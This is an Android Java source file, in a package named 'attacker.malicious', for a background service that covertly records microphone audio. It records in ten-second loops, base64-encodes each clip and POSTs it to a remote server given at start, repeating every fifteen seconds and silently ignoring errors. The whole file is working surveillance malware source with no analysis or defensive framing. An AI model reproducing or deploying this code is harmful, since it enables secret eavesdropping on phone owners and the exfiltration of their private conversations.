package attacker.malicious;


import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class RecorderExfilService extends Service {

    private MediaRecorder registratore = null;
    private static String nomeFileAudio = null;
    private String server;

    public RecorderExfilService() {
        super();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void log(String msg) {
        HashMap<String, String> data = new HashMap<>();
        data.put("log", msg);
        send(data);
    }
    
    public void log(String label, String msg) {
        HashMap<String, String> data = new HashMap<>();
        data.put(label, msg);
        send(data);
    }

    @Override
    public void onDestroy() {
        log("Recorder Exfil Service ", "service destroyed");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("Recorder Exfil Service ", "service started");
        server = intent.getExtras().getString("server");
        run();
        return Service.START_NOT_STICKY;
    }

    private void run(){
        nomeFileAudio = Environment.getExternalStorageDirectory().getAbsolutePath();
        nomeFileAudio += "/recorded_audio.mp4";
        avviaRegistrazione();
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        fermaRegistrazione();
        try {
            onDoneRecordingAudio(nomeFileAudio);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void avviaRegistrazione(){
        registratore = new MediaRecorder();
        registratore.setAudioSource(MediaRecorder.AudioSource.MIC);
        registratore.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        registratore.setOutputFile(nomeFileAudio);
        registratore.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try{
            registratore.prepare();
        }
        catch (IOException e){
            e.printStackTrace();
        }

        registratore.start();
        log("Start Recording");
        
    }

    private void fermaRegistrazione(){
        registratore.stop();
        registratore.release();
        registratore = null;
        log("Finish Recording");
    }


    public void onDoneRecordingAudio(String voiceStoragePath) throws IOException {
        
        byte[] audioBytes = convert(voiceStoragePath);
        String b64_encoded_bytes = Base64.encodeToString(audioBytes, 0);

     
        HashMap<String, String> data = new HashMap<>();
        data.put("audio", b64_encoded_bytes);
        send(data);

        try {
            Thread.sleep(15000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        run();
    }

    public byte[] convert(String path) throws IOException {

        FileInputStream fis = new FileInputStream(path);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] b = new byte[1024];

        for (int readNum; (readNum = fis.read(b)) != -1;) {
            bos.write(b, 0, readNum);
        }

        byte[] bytes = bos.toByteArray();
        return bytes;
    }

    public void send(final HashMap<String, String> data) {
        final RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
    
        StringRequest req = new StringRequest(
                Request.Method.POST,
                server,
                new Response.Listener<String>() { @Override public void onResponse(String response) {}},
                new Response.ErrorListener() { @Override public void onErrorResponse(VolleyError err) {} })
                {
            @Override
            protected Map<String, String> getParams() {
                return data;
            }
        };

        queue.add(req);
    }

}
